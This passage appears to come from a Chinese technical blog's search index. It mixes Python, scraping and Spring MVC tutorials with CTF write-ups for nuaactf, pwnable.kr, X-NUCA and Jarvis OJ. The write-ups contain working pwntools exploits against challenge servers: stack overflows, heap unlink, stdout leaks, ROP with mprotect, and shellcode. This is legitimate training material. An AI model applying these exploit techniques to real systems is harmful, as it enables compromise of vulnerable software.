        <category>web</category>
      </categories>
      <tags>
        <tag>XSS</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[writeup-nuaactf-2018]]></title>
    <url>%2Fposts%2F4721d192%2F</url>
    <content type="text"><![CDATA[overflow 程序逻辑很简单,一个栈溢出,但是有一个类似canary的检测,用的检测值是C语言的rand()生成,不过这个是伪随机数,通过srand()设置随机数种子. 这里用的随机数种子是time(0),在C语言中可以通过time()函数获取到当前的秒数,参数为0则函数返回值即为结果,若参数不为0则结果保存在参数中.所以只要同一秒作为种子生成rand()就可以获得检测值. 123456789//1.c#include&lt;time.h&gt;#include&lt;stdlib.h&gt;#include&lt;stdio.h&gt;int main()&#123; srand(time(0)); printf("%p",rand());&#125; payload 123456789101112131415from pwn import *context.log_level = 'debug's = process("./1")#r = process("./overflow")r = remote("ctf.asuri.org","20001")mi = s.recv()mi = int(mi,16)print hex(mi)payload = 0x20 * 'a' + p32(mi) + p32(0x80485BD) * 4r.send(payload)r.interactive() password_checker 漏洞出现在snprintf函数的返回值,其返回值一直等于需要输出的长度,也就是虽然n会限制输出到s,但是可以通过控制v0来写返回地址. 123456789101112from pwn import *r = remote("ctf.asuri.org","20002")#r = process("./pwn")payload = 0x106 * 'a'r.send(payload)payload = p32(0x8048674)r.send(payload)r.interactive() type_confusion 程序逻辑里会see调用class的第一个指针,c1的是打印字符串,o2的就是system("sh"). 所以只要free一个c1然后用100分配一个o2,see一下获得shell middle 逆向处理字符的汇编代码获得处理过程,通过宏获得异或值,打表对应check值获得flag. plot 绘图获得flag. 1234567891011121314import matplotlib.pyplot as pltf = open("plot.txt")x = [0]y = [0]for n in range(1,1044): line = f.readline() list1 = line.split(" ", 1) x.append(float(list1[0])) y.append(float(list1[1]))plt.plot(x, y) f.close()plt.show() fs 密码在文件末尾,打开dmg文件获得flag. dmg文件是mac的一种镜像文件,在mac中可以直接打开.]]></content>
      <categories>
        <category>writeup</category>
      </categories>
      <tags>
        <tag>Jeopardy</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[CS-develop-python-小技巧]]></title>
    <url>%2Fposts%2F86bcb32a%2F</url>
    <content type="text"><![CDATA[概览 记录一些好用,轻量的python库. PySocks 设置代理. 12345import socksimport socketsocks.set_default_proxy(socks.SOCKS5, "localhost", 9150)socket.socket = socks.socksocket 解析JSON 访问API会返回XML或JSON格式的数据,可以用标准库解析 123456import jsonfrom urllib.request import urlopenresponse = urlopen(url).read().decode('utf-8')Json = json.loads(response)return Json.get(key) 下载文件 123from urllib.request import urlretrieveurlretrieve(url, "path") 发送邮件 1234567891011import smtplibfrom email.mime.text import MIMETextmsg = MIMEText("111")msg["Subject"] = "An Email"msg["From"] = ""msg["To"] = ""s = smtplib.SMTP('localhost')s.send_message(msg)s.quit() python单元测试 实现unittest模块的TestCase类,为每个单元测试提供setUp和tearDown函数,提供不同类型的断言语句让测试成功或者失败,所有需要单元测试的函数以test_开头. 123456789101112131415import unittestclass TestAdd(unittest.TestCase): def setUp(self): print("setUp") def tearDown(self): print("tearDown") def test_Add(self): a = 2 + 2 self.assertEqual(4,a)if __name__ == '__main__': unittest.main() 读写Excel表格 需求库:读Excel的xlrd库和写Excel的xlwt库. 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647# -*- coding: utf-8 -*- import xlrdimport xlwtdef open_excel(file = 'test.xlsx'): try: data = xlrd.open_workbook(file) return data except Exception,e: print str(e)def excel_table_byindex(file = 'test.xlsx', index = 0): data = open_excel(file) table = data.sheets()[index] # table = data.sheet_by_name("test") nrows = table.nrows ncols = table.ncols list =[] for rownum in range(0, nrows): row = table.row_values(rownum) if row: new_row = [] for i in range(len(row)): new_row.append(row[i]) list.append(new_row) testXlwt('new.xls', list) return listdef testXlwt(file = 'new.xls', list = []): book = xlwt.Workbook() sheet1 = book.add_sheet('hello') i = 0 for app in list: j = 0 for k in app: sheet1.write(i, j, k) j = j + 1 i = i + 1 book.save(file)def main(): tables = excel_table_byindex() for row in tables: print rowif __name__=="__main__": main()]]></content>
      <categories>
        <category>CS</category>
        <category>develop</category>
      </categories>
      <tags>
        <tag>python</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[CS-develop-python-scapy-基础]]></title>
    <url>%2Fposts%2Fb00c3563%2F</url>
    <content type="text"><![CDATA[Requests 当存在表单提交时可以使用Requests库. 具体json参数数据格式可以通过GET请求的url或者F12看POST的params获得. 12345678910111213import requestsparams = &#123;'key1':'value1','key2':'value2',...&#125;r = requests.post("url",data = params)print(r.text)file = &#123;'key':open('path/filename','rb')&#125;r = requests.post("url",files = file)cookies = r.cookiesprint(cookies.get_dict())r = requests.post("url",cookies = cookies)#使用delete_cookie(),add_cookie(),delete_all_cookie等方法处理会话cookie 由于cookie可能被网站经常更换,所以使用session更为方便. 12345678import requestsheaders = &#123;...&#125;session = requests.Session()...s = session.post("url",data = params,headers = headers)#伪造headers使你看着不像爬虫 session对象会持续跟踪会话信息(如cookie,header等),也可以访问这些信息:print(s.cookies.get_dict()). 还有HTTP基本接入认证. 1234567import requestsfrom requests.auth import AuthBasefrom requests.auth import HTTPBasicAuthauth = HTTPBasicAuth('name','password')r = requests.post(url = 'url',auth = auth)print(r.text) BeautifulSoup解析HTML 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950from urllib.request import urlopenfrom bs4 import BeautifulSoupfrom urllib.error import HTTPErrordef parser(url): try: html = urlopen(url) #获取request对象 text = html.read() #读取html信息 except HTTPError as e: #错误捕获 print(e) bsObj2 = BeautifulSoup(text,"html.parser") #解析html信息 content = bsObj2.find("div",&#123;"id":"content"&#125;) #属性对应的值可以用正则替代,或者直接使用lambda表达式作为参数 f.write('\n') f.write('\n ') f.write(content.get_text('\n ','&lt;br/&gt;')) #get_text()会清除所有标签,可通过参数选择替代字符 f.write('\n') f.write('\n')base = "https://www.qu.la"book = "/book/394/"try: html = urlopen(base + "/book/394/") text = html.read()except HTTPError as e: print(e)bsObj = BeautifulSoup(text,"html.parser")List = bsObj.findAll("div",&#123;"id":"list"&#125;)#List = bsObj.findAll("div",id = "list")#返回一个数组,find返回第一个f = open(bsObj.h1.get_text() + ".txt","w")page = List[0].findAll("dd")for i in page: f.write(i.a.get_text()) link = i.a.attrs["href"] #访问tag的属性 if book in link: parser(base + link) else: parser(base + book + link) print(i.a.get_text()) BeautifulSoup BeautifulSoup中有四种对象. BeautifulSoup对象,Tag对象,Conment对象(查找注释标签)和NavigableString对象. 其中BeautifulSoup对象把标签组织为一颗树(就像DOM树). 每棵树有例如children,descendants,next_siblings,previous_siblings和parent等属性. 编码问题 现常用的编码方式:ASCII,Unicode(UTF-8,UTF-16等),新的ISO字符集(ISO-8859-[0-127]). 字符串显示转化:str(html.read(),"UTF-8"). 使用bs4和python3.x. 123content = bsObj.find("dd").get_text()content = bytes(content, "UTF-8")content = content.decode("UTF-8") Selenium Selenium可以结合第三方浏览器执行JavaScript,可以结合无头浏览器PhantomJS使用. 1234567891011121314151617181920212223242526from selenium import webdriver#selenium.webdriver.ActionChains,selenium.webdriver.common.keys,selenium.webdriver.remote.webelementimport time#service_args = ['--proxy = localhost:9150','--proxy-type = socks5']#用于设置代理driver = webdriver.PhantomJS(executable_path = 'path')driver.get("url")time.sleep(3)#等待页面加载content = driver.find_element_by_id('content')#复数选择器find_elements_by_idcontent.is_displayed()#检测是否为隐含字段print(content.text)#元素其他属性或方法:click(),click_and_hold(),release(),double_click(),send_keys_to_element("aaa")等#多个方法执行可以使用ActionChains(driver).click(element).send_keys(keys.RETURN)...#使用pagesource返回网页源代码而不是转化过的以此解析htmldriver.close() 上面是显式等待,下面使用隐式等待来监听expected_conditions(DOM的触发状态). 12345678910111213from selenium.webdriver.common.by import By#定位器:ID,CLASS_NAME,CSS_SELECTOR,LINK_TEXT,PARTIAL,NAME,TAG_NAME,XPATHfrom selenium.webdriver.support.ui import WebDriverWaitfrom selenium.webdriver.support import expected_conditions as ECdriver = webdriver.PhantomJS(executable_path = 'path')driver.get("http://pythonscraping.com/pages/javascript/ajaxDemo.html")try: element = WebDriverWait(driver,10).until(EC.presence_of_element_located((By.ID,"loadedButton")))finally: print(driver.find_element_by_id("content").text) driver.close() 通过监视DOM元素来捕获StaleElementReferenceException异常来检测重定向的完成. 123456elem = driver.find_element_by_tag_name("html")...try: elem == driver.find_element_by_tag_name("html")except StaleElementReferenceException: return 爬虫实例 参考:https://juejin.im/post/58dce2248d6d8100613a4cfb. http.cookiejar模块可用于自动处理HTTP Cookie,http.cookiejar.LWPCookieJar对象就是对cookies的封装,支持把cookies保存到文件以及从文件中加载. 1234567from http import cookiejarsession = requests.session()session.cookies = cookiejar.LWPCookieJar(filename='cookies.txt')try: session.cookies.load(ignore_discard=True)except LoadError: print("load cookies failed") 获取知乎用于防御csrf的token. 12345def get_xsrf(): response = session.get("https://www.zhihu.com", headers=headers) soup = BeautifulSoup(response.content, "html.parser") xsrf = soup.find('input', attrs=&#123;"name": "_xsrf"&#125;).get("value") return xsrf 获取验证码并人工识别. 123456789101112def get_captcha(): """ 把验证码图片保存到当前目录，手动识别验证码 :return: """ t = str(int(time.time() * 1000)) captcha_url = 'https://www.zhihu.com/captcha.gif?r=' + t + "&amp;type=login" r = session.get(captcha_url, headers=headers) with open('captcha.jpg', 'wb') as f: f.write(r.content) captcha = input("验证码：") return captcha 登录. 1234567891011121314def login(email, password): login_url = 'https://www.zhihu.com/login/email' data = &#123; 'email': email, 'password': password, '_xsrf': get_xsrf(), "captcha": get_captcha(), 'remember_me': 'true'&#125; response = session.post(login_url, data=data, headers=headers) login_code = response.json() print(login_code['msg']) for i in session.cookies: print(i) session.cookies.save() 复制代码请求成功后,session会自动把服务端的返回的cookie信息填充到session.cookies对象中,下次请求时,客户端就可以自动携带这些cookie去访问那些需要登录的页面了.]]></content>
      <categories>
        <category>CS</category>
        <category>develop</category>
      </categories>
      <tags>
        <tag>python</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[writeup-pwnable-kr]]></title>
    <url>%2Fposts%2Fc692c40b%2F</url>
    <content type="text"><![CDATA[unlink unlink函数可以任意写,程序unlink之后直接结束,只能覆盖返回地址 12345678void unlink(OBJ* P)&#123; OBJ* BK; OBJ* FD; BK=P-&gt;bk; FD=P-&gt;fd; FD-&gt;bk=BK; BK-&gt;fd=FD;&#125; main函数结尾汇编代码如下,可以更改ebp从而劫持esp到可控区域,ret到shell 123480485ff: 8b 4d fc mov -0x4(%ebp),%ecx ;ecx = [ebp - 4]8048602: c9 leave ;mov esp, ebp;pop ebp8048603: 8d 61 fc lea -0x4(%ecx),%esp ;esp = [ecx - 4]8048606: c3 ret; 12345678910111213141516171819from pwn import *r = process("./unlink")r.recvuntil("leak: ")stack = int(r.recvline(),16)r.recvuntil("leak: ")heap = int(r.recvline(),16)print "stack: " + hex(stack)print "heap: " + hex(heap)gdb.attach(r)payload = p32(0x80484eb) + p32(heap + 0xc) + "a" * 8 + p32(stack - 0x20) + p32(heap + 0x10)#FD = stack - 0x20;BK = heap + 0x10;heap + 0x10 = stack - 0x20;stack - 0x1c = heap + 0x10;#stack - 0x1c即unlink被调用者保存的ebp,从而更改ebpr.sendline(payload)r.interactive() fd 标准输入的fd为0,以0x1234(4660)为命令行参数即可 col]]></content>
      <categories>
        <category>writeup</category>
      </categories>
      <tags>
        <tag>Jeopardy</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[CS-develop-BackEnd-Spring-MVC-基础]]></title>
    <url>%2Fposts%2Fe51dba12%2F</url>
    <content type="text"><![CDATA[概念 Spring框架是一个轻量级的开源企业应用开发框架,包含很多不同的子模块. 在早期Java Web的开发中,统一把显示层,控制层,数据层的操作全部交给JSP或者Java Bean来进行处理.这导致了JSP和Java Bean,Java代码和HTML代码之间严重耦合,代码难以复用. 很快这种方式就被Servlet + JSP + Java Bean所替代了,也就是MVC模式的初始形态. 模型-视图-控制器模式,把软件系统分为三个基本部分:模型(Model),视图(View)和控制器(Controller). 控制器(Controller):负责转发请求,对请求进行处理. 视图(View):界面设计人员进行图形界面设计. 模型(Model):程序员编写程序应有的功能,数据库专家进行数据管理和数据库设计(可以实现具体的功能). 为解决持久层中的数据库编程,Spring MVC将传统的模型层被拆分为了业务层(Service)和数据访问层(DAO, Data Access Object),在Service下可以通过Spring的声明式事务操作数据访问层,而在业务层上还允许访问NoSQL. 一个Java Bean必须拥有以一个无参的构造器,通过get/set方法访问参数,同时支持持久化. 所有JSP文件都放在WEB-INF目录下,因此无法被直接访问. 开发环境 IDEA(或其他IDE),JDK. 项目属性选择Spring-&gt;Spring MVC即可. Spring MVC Spring MVC是Spring的一个子模块,可以帮助开发者更快速的开发一个MVC应用. 下面是部分功能列表 Dispatcher Servlet. 基于XML的配置文件. 数据绑定(包括数据类型转化). 内置常见校验器. 支持多种视图技术. Dispatcher Servlet Spring MVC内置的请求转发Servlet,配置于部署描述符(WEB-INF\web.xml). 123456789101112131415161718192021222324&lt;servlet&gt; &lt;servlet-name&gt;dispatcher&lt;/servlet-name&gt; &lt;servlet-class&gt;org.springframework.web.servlet.DispatcherServlet&lt;/servlet-class&gt; &lt;load-on-startup&gt;1&lt;/load-on-startup&gt; &lt;!-- 是否启动时init --&gt; &lt;!-- &lt;init-param&gt; &lt;param-name&gt;contextConfigLocation&lt;/param-name&gt; &lt;param-value&gt;&#123;path&#125;&lt;/param-value&gt; &lt;/init-param&gt; 用于改变默认配置文件 --&gt; &lt;!-- &lt;multipart-config&gt; &lt;max-file-size&gt;20848820&lt;/max-file-size&gt; &lt;/multipart-config&gt; 文件上传必须配置 --&gt;&lt;/servlet&gt;&lt;servlet-mapping&gt; &lt;servlet-name&gt;dispatcher&lt;/servlet-name&gt; &lt;url-pattern&gt;/&lt;/url-pattern&gt; &lt;!-- 表示匹配所有uri --&gt;&lt;/servlet-mapping&gt; 默认初始化时在WEB-INF目录下寻找servletName-servlet.xml配置文件,可使用&lt;init-param&gt;自定义配置文件. Controller Spring2.5前开发控制器需要实现org.springframework.web.servlet.mvc.Contrtoller接口.对应配置文件要配置请求映射. Spring2.5后引入了注释类型Controller和RequestMapping. 其中Controller声明控制器,需要在配置文件声明spring-context(idea自动配置)并应用&lt;component-scan/&gt;元素.RequestMapping用于映射一种请求或方法,有默认属性value,和限制处理方法的method. 基于注解的控制器比之前有几个优点 一个控制器类处理多个动作. 请求映射不用写在配置文件中. 请求处理方法 支持的方法参数类型 Servlet API中的Request或Response对象.ServletRequest或HttpServletRequest等.获得请求参数. Servlet API中的HttpSession对象. org.springframework.web.context.request里的WebRequest或NativeWebRequest. java.util.Locale. java.io.InputStream/java.io.Reader.其值是Servlet API的原始的InputStream/Reader. java.io.OutputStream/java.io.Writer.其值是Servlet API的原始OutputStream/Writer. org.springframework.http.HttpMethod.HTTP请求的方法. java.security.Principal.包含当前身份验证的用户. HttpEntity&lt;?&gt;. java.util.Map/org.springframework.ui.Model/org.springframework.ui.ModelMap.装饰web视图暴露的的隐式模型. org.springframework.web.servlet.mvc.support.RedirectAttributes.重定向传值. 命令或表单对象. org.springframework.validation.Errors/org.springframework.validation.BindingResult.前命令之前或表单对象验证结果. org.springframework.web.bind.support.SessionStatus. org.springframework.web.util.UriComponentsBuilder.一个builder用于准备一个URL相对于当前请求的host,port,scheme,context path和servlet映射的文字部分. @PathVariable.注解参数用于获取URI模板变量. @MatrixVariable.注解参数访问位于URI路径的键值对. @RequestParam.注解参数访问特定的Servlet请求参数.获得请求参数并转换为声明的方法参数类型. @RequestHeader.注解参数访问Servlet的HTTP请求中特殊的headers.参数值转换为声明的方法参数类型. @RequestBody.注解参数访问HTTP请求的body.参数值使用HttpMessageConverters转换为声明的方法参数类型. @RequestPart.注解参数获取的content中的multipart/form-data要求的部分. 支持的返回值类型 ModelAndView,这个model隐含command对象和@ModelAttribute注释的结果. Model,返回对象来表示模型,利用RequestToViewNameTranslator把请求转换为视图名称.这个model隐含command对象和@ModelAttribute注释结果. Map,返回对象来表示模型,利用RequestToViewNameTranslator把请求转换为视图名称.这个model隐含command对象和@ModelAttribute注释结果. View,这个model隐含command对象和@ModelAttribute注释的结果.处理方法通过声明的Model类型的参数来编程填充这个模型. String,这个String值被Spring MVC解读为合理的视图名称.这个model隐含command对象和@ModelAttribute注释的结果.处理方法通过声明的Model类型的参数来编程填充这个模型. void,返回空void表示方法自己处理响应. HttpEntity&lt;?&gt;/ResponseEntity&lt;?&gt;,用来提供使用Servlet中HTTP中response中的headers和contents. Callable&lt;?&gt;,当Spring MVC管理的一个应用想要通过异常的形式返回参数. DeferredResult&lt;?&gt;,当应用想要通过它选择的线程来产生返回值,可以使用这个参数. 其他任意类型,被Spring认为是view中的model属性. @ModelAttribute 用于参数时隐式添加对象到Model对象或者用于方法时使方法在该控制器类调用请求处理方法前调用. 转化器和格式化 转化器需要实现接口org.springframework.core.convert.converter.Converter并在配置文件中配置. 格式化需要实现接口org.springframework.format.Formatter并在配置文件中配置或者使用FormatterRegistrar接口注册. tips:在web层一般使用Formatter. 验证器 限制转化后的模型值的范围,包括Spring验证器和JSR 303验证. Spring验证器需实现org.springframework.validation.Validator接口,验证器不需要显示注册,但发送的错误信息可以自定义,自定义文件需要通过配置文件声明messageSource bean来扫描. JSR 303验证不需要验证器,只需要利用JSR 303标注类型嵌入约束即可,对应错误信息可以使用自定义文件覆盖. 配置文件样例 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556&lt;?xml version="1.0" encoding="UTF-8"?&gt;&lt;beans xmlns="http://www.springframework.org/schema/beans" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:context="http://www.springframework.org/schema/context" xmlns:mvc="http://www.springframework.org/schema/mvc" xsi:schemaLocation="http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd http://www.springframework.org/schema/context http://www.springframework.org/schema/context/spring-context.xsd http://www.springframework.org/schema/mvc http://www.springframework.org/schema/mvc/spring-mvc.xsd"&gt; &lt;bean name="/input" class="com.warden.input" /&gt; &lt;!-- 配置控制器(非注解) --&gt; &lt;bean id="viewResolver" class="org.springframework.web.servlet.view.InternalResourceViewResolver"&gt; &lt;property name="suffix" value=".jsp" /&gt; &lt;property name="prefix" value="/WEB-INF/jsp/" /&gt; &lt;/bean&gt; &lt;!-- 处理视图映射 --&gt; &lt;context:component-scan base-package="com.warden" /&gt; &lt;!-- 用于扫描注解的控制器和服务 --&gt; &lt;mvc:annotation-driven/&gt; &lt;mvc:resources mapping="/css/**" location="/css/" /&gt; &lt;mvc:resources mapping="/*.html" location="/" /&gt; &lt;!-- 为了正确处理静态资源进行映射 --&gt; &lt;mvc:annotation-driven conversion-service="conversionService"/&gt; &lt;!-- 为conversion-service属性赋bean名称 --&gt; &lt;bean id="conversionService" class="org.springframework.context.support.ConversionServiceFactoryBean"&gt; &lt;property name="converters"&gt; &lt;list&gt; &lt;bean class="com.warden.InputConverter"&gt; &lt;constructor-arg type="java.lang.String" value="aaa"/&gt; &lt;/bean&gt; &lt;/list&gt; &lt;/property&gt; &lt;/bean&gt; &lt;bean id="conversionService" class="org.springframework.format.support.FormattingConversionServiceFactoryBean"&gt; &lt;property name="formatters"&gt; &lt;list&gt; &lt;bean class="com.warden.InputFormatter"&gt; &lt;constructor-arg type="java.lang.String" value="aaa"/&gt; &lt;/bean&gt; &lt;/list&gt; &lt;/property&gt; &lt;/bean&gt; &lt;!-- 用于配置对应的转发器和格式化器 --&gt; &lt;bean id="messageSource" class="org.springframework.context.support.ReloadableResourceBundleMessageSource"&gt; &lt;property name="basename" value="***" /&gt; &lt;/bean&gt; &lt;!-- 用于配置自定义错误信息文件 --&gt; &lt;bean id="multipartResolver" class="org.springframework.web.multipart.support.StandardMultipartHttpServletRequest"&gt; &lt;/bean&gt; &lt;!-- 文件上传配置 --&gt;&lt;/beans&gt; 数据绑定和表单标签 即将用户输入直接与模型属性绑定,通过元素的path属性绑定即可,使用需声明taglib指令. 文件下载与上传简述 Spring MVC中前端上传的文件会包含在一个MultipartFile对象中,只需要用类型为MultipartFile的属性编写一个domain类.然后使用org.springframework.web.multipart.MultipartFile类的方法操作这个属性即可. Servlet3.0以下需要使用其他组件实现文件上传(Apache Commons FileUpload元件),这里不涉及这种情况. Servlet3.0及以上只需要对上传文件的Servlets以@MultipartConfig进行标注即可.(DispatcherServlet可以使用&lt;multipart-config&gt;来代替标注,然后在配置文件中配置) 文件下载只需要在控制器里完成 请求处理方法返回void,在方法中添加HttpServletResponse参数 将响应内容ContentType设为文件内容类型(不清楚可以设置为APPLICATION/OCTET-STREAM) 添加一个Content-Disposition的HTTP响应标题,并赋值:attachment;filename=fileName来设置默认文件名 使用response的getOutputStream方法将文件字节流写入即可 第四步示例. 123456FileInputStream f = new FileInputStream(file);BufferedInputStream buf = new BufferedInputStream(f);byte[] bytes = new byte[buf.available()];OutputStream os = response.getOutputStream();buf.read(bytes);os.write(bytes); 为了防止资源泄露可以添加对登录状态的check和referer来限制资源的发送. Spring MVC请求解析 请求离开浏览器以后,第一站到达的就是DispatcherServlet,然后DispatcherServlet将这些请求发送给Spring MVC的控制器. DispatcherServlet会查询一个或多个处理器映射来确定请求的下一站在哪里,处理器映射会根据请求所携带的URL信息来进行决策.一旦选择了合适的控制器,DispatcherServlet会将请求发送给选中的控制器. 当控制器在完成逻辑处理后,通常会产生一些信息,这些信息需要以用户友好的方式进行格式化,一般会是 HTML,所以信息需要发送给一个视图,通常会是JSP. 控制器所做的最后一件事就是将模型数据打包,并且表示出用于渲染输出的视图名.它接下来会将请求连同模型和视图名发送回DispatcherServlet. 既然DispatcherServlet已经知道由哪个视图渲染结果,最后一站是视图的实现,在这里它交付模型数据,请求的任务也就完成了.]]></content>
      <categories>
        <category>CS</category>
        <category>develop</category>
      </categories>
      <tags>
        <tag>BackEnd</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[writeup-xnuca-2018-quals]]></title>
    <url>%2Fposts%2F659cbaf1%2F</url>
    <content type="text"><![CDATA[Code_Interpreter 程序逻辑为读取code文件里的数据流,然后根据关键函数操作. 跟踪数据流得出表达式获得flag. Steak delete函数存在uaf,edit存在overlop.直接unlink使buf = buf - 0x18. 利用copy函数任意读写将stdout置于可控区域,修改stdout的_IO_write_base指针到想泄露的内存区域. 开始使用的是劫持__malloc_hook到one_gadget,条件不足. 然后泄露environ并根据偏移算出main函数返回地址所在的栈地址,使用ROP调用mprotect修改bss的页属性写shellcode,getshell失败.最后复现使用open读取flag文件. 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107from pwn import *buf = 0x6021A0def add(size,buf): r.sendline('1') r.sendlineafter('size:\n', str(size)) r.sendlineafter('buf:\n', buf) r.recvuntil('&gt;\n', timeout = 1)def delete(index): r.sendline('2') r.sendlineafter('index:\n', str(index)) r.recvuntil('&gt;\n', timeout = 1)def edit(index,size,buf): r.sendline('3') r.sendlineafter('index:\n', str(index)) r.sendlineafter('size:\n', str(size)) r.sendafter('buf:\n', buf) r.recvuntil("&gt;\n", timeout = 1)def copy(sindex, dindex, length): r.sendline('4') r.sendlineafter('index:\n', str(sindex)) r.sendlineafter('index:\n', str(dindex)) r.sendlineafter('length:\n', str(length)) r.recvuntil('&gt;\n',timeout = 1)r = process(['./steak'], env=&#123;"LD_PRELOAD":"./libc-2.23.so"&#125;)# r = remote("106.75.115.249", "39453")r.recvuntil('&gt;\n', timeout = 1)add(0x90, "1")#0add(0x90, "1")#1add(0x90, "1")#2payload = p64(0) + p64(0x91) + p64(buf - 0x18) + p64(buf - 0x10) + "a" * 0x70 + p64(0x90) + p64(0xa0)edit(0, 0xb0, payload)delete(1)# buf = &amp;buf - 0x18add(0x120, "1")#3payload = p64(0x6021A0) * 4 + p64(0x602180) + p64(0x6021c0) + p64(0x602500)edit(0, 0x40, payload)copy(1, 2, 8)# 4 -&gt; _IO-2_1_stdout_payload = p64(0xfbad3887) + "\x11" * 24 + "\x40"#根据相对偏移溢出_IO_write_baser.sendline('3')r.sendlineafter('index:\n', str(4))r.sendlineafter('size:\n', str(0x28))r.sendafter('buf:\n', payload)data = r.recvuntil("&gt;\n")libc = u64(data[:8].ljust(8, "\x00")) - 0x3c5640print "libc: " + hex(libc)# payload = p64(libc + 0x45216) + p64(libc + 0x3c4b10)# edit(2, 0x20, payload)# # 4 -&gt; one_gadget,5 -&gt; __malloc_hook# copy(2, 5, 8)# r.sendline('1')# r.sendlineafter('size:\n', str(16))payload = p64(0xfbad3887) + "\x11" * 24 + p64(libc + 0x3c6f38) + p64(libc + 0x3c6f40)# 根据libc地址 + 偏移溢出_IO_write_baser.sendline('3')r.sendlineafter('index:\n', str(4))r.sendlineafter('size:\n', str(0x30))r.sendafter('buf:\n', payload)data = r.recvuntil("&gt;\n")stack = u64(data[:8].ljust(8, "\x00")) - 0xf0#调试得出main函数返回地址的栈地址print "stack: " + hex(stack)payload = p64(stack)edit(2, 0x10, payload)# 4-&gt;stack#payload = p64(libc + 0x45216)#r.sendline('3')#r.sendlineafter('index:\n', str(4))#r.sendlineafter('size:\n', str(0x10))#r.sendafter('buf:\n', payload)#r.sendline('0')x86_shellcode = asm("mov eax, 0x5; mov ebx, 0x602600; mov ecx, 0; int 0x80; mov ebx, eax; mov eax, 3; mov ecx, 0x602700; mov edx, 0x40; int 0x80; mov eax, 4; mov ebx, 1; mov ecx, 0x602700; mov edx, 0x40; int 0x80", arch = 'amd64', os = 'linux')edit(3, 0x100, x86_shellcode)payload = p64(0x6021A0) + p64(0x602180) + p64(0x6021c0) + p64(0x602600)edit(0, 0x30, payload)edit(3, 0x10, "flag")pop_rdi = 0x400ca3# pop rdi;retpprsi = 0x400ca1# pop rsi; pop r15;retpop_rdx = 0x1b92 + libc# pop rdx; retpayload = p64(pop_rdi) + p64(0x602000) + p64(pprsi) + p64(0x1000) + p64(0) + p64(pop_rdx) + p64(7) + p64(libc + 0x101770) + p64(0x602500)r.sendline('3')r.sendlineafter('index:\n', str(4))r.sendlineafter('size:\n', str(0x50))r.sendafter('buf:\n', payload)r.sendlineafter('&gt;\n','0')r.interactive()]]></content>
      <categories>
        <category>writeup</category>
      </categories>
      <tags>
        <tag>Jeopardy</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[writeup-Jarvis]]></title>
    <url>%2Fposts%2F1699a56d%2F</url>
    <content type="text"><![CDATA[BASIC 德军的密码 费纳姆密码,密钥长度12位,密文长度84位,密文7位一组. 将密文七位一组转成数字以后与密钥进行各种运算,最终试出是异或. 关于USS Lab google即可. veryeasy UTF-8打开发现flag字符串. Help!! binwalk -e即可. 握手包 aircrack-ng -w password.txt wifi.cap. shellcode .\shellcodeexec.x32.exe &lt;文件内容&gt;. 美丽的实验室logo Stegsolve-&gt;Frame Broswer. 手贱 有一个字母l,去掉正好32位解密出flag. veryeasyRSA 123456789import gmpy2p = 3487583947589437589237958723892346254777q = 8767867843568934765983476584376578389e = 65537on = (p-1) * (q-1)d = gmpy2.invert(e,on)print d 神秘的文件 Binwalk发现为磁盘文件. 12mkdir hhmount haha hh 发现里面大量文件,使用python遍历获得flag. PWN [XMAN]level4 和level3基本一样,没有提供libc,开始找最后三位偏移,找不到. 使用pwntools的DynELF模块泄露出system位置即可. 123456789101112131415161718192021222324252627from pwn import *#r = process("./level4")r = remote("pwn2.jarvisoj.com","9880")elf = ELF("./level4")ppp_ret = 0x08048509main = elf.symbols['main']def leak(address): payload = 'a' * 0x8c payload += p32(elf.plt["write"]) + p32(ppp_ret) + p32(1) + p32(address) + p32(4) + p32(main) r.send(payload) data = r.recv(4) log.info("leaking address =&gt; &#123;&#125;".format(hex(address))) return datad = DynELF(leak,elf=ELF('./level4'))system = d.lookup('system','libc')log.success("system address =&gt; &#123;&#125;".format(hex(system)))payload = 'a' * 0x8cpayload += p32(elf.plt["read"]) + p32(ppp_ret) + p32(0) + p32(elf.got["write"]) + p32(8)payload += p32(system) + p32(main) + p32(elf.got["write"])r.send(payload)r.send('/bin/sh\x00')r.interactive() [XMAN]level5 123456789101112131415161718192021222324252627282930313233343536373839from pwn import *context.log_level = "debug"context.arch = "amd64"r = remote("pwn2.jarvisoj.com","9884")elf = ELF("./level3_x64")poprdi_ret = 0x4006b3poprsi_pop_ret = 0x4006b1r.recvuntil(":\n")payload = "a" * 0x88payload += p64(poprdi_ret) + p64(1) + p64(poprsi_pop_ret) + p64(elf.got["write"]) + p64(0) + p64(elf.plt["write"])payload += p64(poprdi_ret) + p64(0) + p64(poprsi_pop_ret) + p64(elf.got["write"]) + p64(0) + p64(elf.plt["read"])payload += p64(elf.sym['_start'])r.send(payload)libc = u64((r.recv())[0:8].ljust(8,"\x00")) - 0xef3b0# nm -D libc-2.19.so | grep writeprint "libc: " + hex(libc)r.send(p64(libc + 0xf8590))# write@got -&gt; mprotectpoprdx_ret = libc + 0x1b8esleep(1)payload = "a" * 0x88payload += p64(poprdi_ret) + p64(0x600000) + p64(poprsi_pop_ret) + p64(0x1000) + p64(0) + p64(poprdx_ret) + p64(7) + p64(elf.plt["write"])payload += p64(poprdi_ret) + p64(0) + p64(poprsi_pop_ret) + p64(0x600A88) + p64(0) + p64(poprdx_ret) + p64(0x100) + p64(elf.plt["read"])payload += p64(0x600A88)r.send(payload)r.send(asm(shellcraft.sh()))r.interactive() [Xman]level6_x64 delete后没有清除指针,先malloc多个小chunk,free后malloc一个大的进行堆布局,触发unlink.之后就可以任意读写了. 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879from pwn import *from LibcSearcher import *context.log_level = "debug"def List(): r.sendline("1") data = r.recvuntil("Your choice: ") return datadef New(size, content): r.sendline("2") r.sendlineafter("Length of new note: 